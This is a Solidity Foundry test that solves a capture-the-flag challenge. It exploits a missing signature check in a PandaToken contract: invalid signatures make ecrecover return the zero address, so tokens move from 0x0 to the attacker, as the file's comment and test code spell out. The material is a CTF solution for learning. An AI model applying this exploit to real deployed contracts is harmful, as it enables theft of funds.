// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/PandaToken.sol";

/* GOAL: 
To pass the CTF, the hacker must have 3 tokens (3e18) on their account.
You are a hacker, not the “owner”.

Solution:
0x0 address has 10 PandaTokens set in constructor
getTokens() function does not have a validation if signature is valid or not
If signature is not valid then it will return 0x0

If we provide invalid signature, tokens will be 'burned' from 0x0 address and minted to hacker
*/

contract PandaTokenAttack is Test {
    PandaToken pandatoken;
    address owner = vm.addr(1);
    address hacker = vm.addr(2);

    function setUp() external {
        vm.prank(owner);
        pandatoken = new PandaToken(400, "PandaToken", "PND");
    }

    function test() public {
        vm.startPrank(hacker);
        bytes32 hash = keccak256(abi.encode(hacker, 1 ether));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(1, hash);

        // your goal - to have 3 tokens (3e18) on your own(hacker) balance.
        // solution

        //provide invalid signature by changing v parameter
        pandatoken.getTokens(1 ether, abi.encode(r, s, uint(0)));
        pandatoken.getTokens(1 ether, abi.encode(r, s, uint(1)));
        pandatoken.getTokens(1 ether, abi.encode(r, s, uint(2)));
       

        assertEq(pandatoken.balanceOf(hacker), 3 ether);
    }
}